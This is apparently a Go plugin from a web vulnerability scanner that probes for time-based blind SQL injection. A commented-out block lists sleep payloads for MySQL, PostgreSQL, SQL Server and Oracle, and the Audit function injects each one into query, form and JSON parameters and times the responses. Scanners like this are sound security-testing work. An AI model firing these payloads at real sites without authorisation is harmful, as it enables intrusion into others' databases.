package PerFile

import (
	"encoding/json"
	"jray/addon/BugCheck/Common"
	"jray/addon/BugCheck/Ginfo/Ghttp"
	"strings"
	"sync"
	"time"
)

var checkSleepSql map[string][]string

//实现存在缺陷 暂时不支持注入
//func init() {
//	sqliSleepScan := SqliSleepScan{Common.PluginBase{Name: "Sql注入时间盲注", Desc: "存在Sql注入时间盲注", Type: "SQL注入", Ltype: "", TimeOut: 25, Level: 5},
//		3, 3, &sync.Mutex{}}
//	Common.AddBugScanListPerFile(sqliSleepScan)
//	ct := time.Now() //代表当前时间的time对象
//	ts := ct.Unix()  //unix时间戳
//	//利用时间戳设置rand的种子数
//	rand.Seed(ts)
//	r1 := rand.Intn(5)
//
//	checkSleepSql = map[string][]string{
//		"MySql": []string{fmt.Sprintf(" AND SLEEP(%d)", sqliSleepScan.SleepTimeOut),
//			fmt.Sprintf(" AND SLEEP(%d)--+", sqliSleepScan.SleepTimeOut),
//			fmt.Sprintf("' AND SLEEP(%d)", sqliSleepScan.SleepTimeOut),
//			fmt.Sprintf("' AND SLEEP(%d)--+", sqliSleepScan.SleepTimeOut),
//			fmt.Sprintf("' AND SLEEP(%d) AND '%d'='%d", sqliSleepScan.SleepTimeOut, r1, r1),
//			fmt.Sprintf("\" AND SLEEP(%d) AND \"%d\"=\"%d", sqliSleepScan.SleepTimeOut, r1, r1),
//			fmt.Sprintf("'and(select*from(select+sleep(%d))a/**/union/**/select+1)='", sqliSleepScan.SleepTimeOut),
//			fmt.Sprintf("\"and(select*from(select+sleep(%d))a/**/union/**/select+1)=\"", sqliSleepScan.SleepTimeOut),
//		}, "Postgresql": []string{
//			fmt.Sprintf(" AND %d=(SELECT %d FROM PG_SLEEP(%d))", sqliSleepScan.SleepTimeOut, r1, r1),
//			fmt.Sprintf(" AND %d=(SELECT %d FROM PG_SLEEP(%d))--+", sqliSleepScan.SleepTimeOut, r1, r1),
//		}, "Microsoft SQL Server or Sybase": []string{
//			fmt.Sprintf(" waitfor delay '0:0:%d'--+", sqliSleepScan.SleepTimeOut),
//			fmt.Sprintf("' waitfor delay '0:0:%d'--+", sqliSleepScan.SleepTimeOut),
//			fmt.Sprintf("\" waitfor delay '0:0:%d'--+", sqliSleepScan.SleepTimeOut),
//		}, "Oracle": []string{
//			fmt.Sprintf(" and 1= dbms_pipe.receive_message('RDS', %d)--+", sqliSleepScan.SleepTimeOut),
//			fmt.Sprintf("' and 1= dbms_pipe.receive_message('RDS', %d)--+", sqliSleepScan.SleepTimeOut),
//			fmt.Sprintf("\"  and 1= dbms_pipe.receive_message('RDS', %d)--+", sqliSleepScan.SleepTimeOut),
//			fmt.Sprintf(" AND 3437=DBMS_PIPE.RECEIVE_MESSAGE(CHR(100)||CHR(119)||CHR(112)||CHR(71),%d)", sqliSleepScan.SleepTimeOut),
//			fmt.Sprintf(" AND 3437=DBMS_PIPE.RECEIVE_MESSAGE(CHR(100)||CHR(119)||CHR(112)||CHR(71),%d)--+", sqliSleepScan.SleepTimeOut),
//		}}
//}

type SqliSleepScan struct {
	Common.PluginBase
	SleepTimeOut int
	CheckSum     int
	Metux        *sync.Mutex
}

func (p SqliSleepScan) Exec(p1 Common.PluginBaseFun, request Common.Request, response Common.Response) {
	//p.SleepTimeOut=5
	p.Request = request
	p.Response = response
	p.Audit()
}
func (p SqliSleepScan) Audit() {

	for k, v := range checkSleepSql {
		for _, sql := range v {

			if p.Request.Method == "GET" && p.Request.URL.RawQuery != "" {
				//url2 := p.Request.CheckUrl.String()
				//result2 := Ghttp.Analyze(url2, "GET", "", p.Request.Header, p.TimeOut)
				requestVuls := p.Request.CheckUrl.Query()
				for k1, _ := range requestVuls {
					v1 := requestVuls.Get(k1)
					requestVuls.Set(k1, v1+sql)
					p.Request.CheckUrl.RawQuery = requestVuls.Encode()
					//加锁 防止出现多个请求同时进入，导致计时不准确的情况，但是效率会很低
					p.Metux.Lock()
					checkCount := 0
					for i := 0; i < p.CheckSum; i++ {
						startTime := time.Now()
						result := Ghttp.Analyze(p.Request.CheckUrl.String(), "GET", "", p.Request.Header, p.TimeOut)
						t := time.Now().Sub(startTime)
						if result.StatusCode > 0 && t >= time.Duration(p.SleepTimeOut)*time.Second && t < time.Duration(p.TimeOut)*time.Second {
							checkCount++
						} else {
							break
						}
					}
					p.Metux.Unlock()

					if checkCount == p.CheckSum {
						p.Success(p.Name, p.Request.URL.String(), p.Type, k, requestVuls.Encode())

						//目前是发现注入点就退出，不继续寻找下一个注入点
						return
					}
					requestVuls.Set(k1, v1)
				}

			}
			if p.Request.Method != "GET" && len(p.Request.Body) > 0 {

				contentType := p.Request.Header.Get("Content-Type")
				if strings.Contains(contentType, "application/x-www-form-urlencoded") || !strings.Contains(contentType, "application/json") {
					p.Request.CheckUrl.RawQuery = string(p.Request.Body)
					requestVuls := p.Request.CheckUrl.Query()
					for k1, _ := range requestVuls {
						v1 := requestVuls.Get(k1)
						requestVuls.Set(k1, v1+sql)

						p.Metux.Lock()
						checkCount := 0
						for i := 0; i < p.CheckSum; i++ {
							startTime := time.Now()
							result := Ghttp.Analyze(p.Request.URL.String(), p.Request.Method, requestVuls.Encode(), p.Request.Header, p.TimeOut)
							t := time.Now().Sub(startTime)
							if result.StatusCode > 0 && t >= time.Duration(p.SleepTimeOut)*time.Second && t < time.Duration(p.TimeOut)*time.Second {
								checkCount++
							} else {
								break
							}
						}
						p.Metux.Unlock()

						if checkCount == p.CheckSum {
							p.Success(p.Name, p.Request.URL.String(), p.Type, k, requestVuls.Encode())

							//目前是发现注入点就退出，不继续寻找下一个注入点
							return
						}

						requestVuls.Set(k1, v1)
					}

				} else if strings.Contains(contentType, "application/json") {
					var f interface{}
					json.Unmarshal(p.Request.Body, &f)
					if f == nil {
						return
					}
					m := f.(map[string]interface{})
					for k1, v1 := range m {
						switch v1.(type) {
						case string:

							vvv1 := v1
							m[k1] = v1.(string) + sql
							bodym, _ := json.Marshal(m)

							p.Metux.Lock()
							checkCount := 0
							for i := 0; i < p.CheckSum; i++ {
								startTime := time.Now()
								result := Ghttp.Analyze(p.Request.URL.String(), p.Request.Method, string(bodym), p.Request.Header, p.TimeOut)
								t := time.Now().Sub(startTime)

								if result.StatusCode > 0 && t >= time.Duration(p.SleepTimeOut)*time.Second && t < time.Duration(p.TimeOut)*time.Second {
									checkCount++
								} else {
									break
								}
							}
							p.Metux.Unlock()
							if checkCount == p.CheckSum {
								p.Success(p.Name, p.Request.URL.String(), p.Type, k, string(bodym))
								//目前是发现注入点就退出，不继续寻找下一个注入点
								return
							}
							m[k1] = vvv1
						case int:
						case float64:
						case []interface{}:
						default:
						}
					}
				}
			}

		}
	}
}
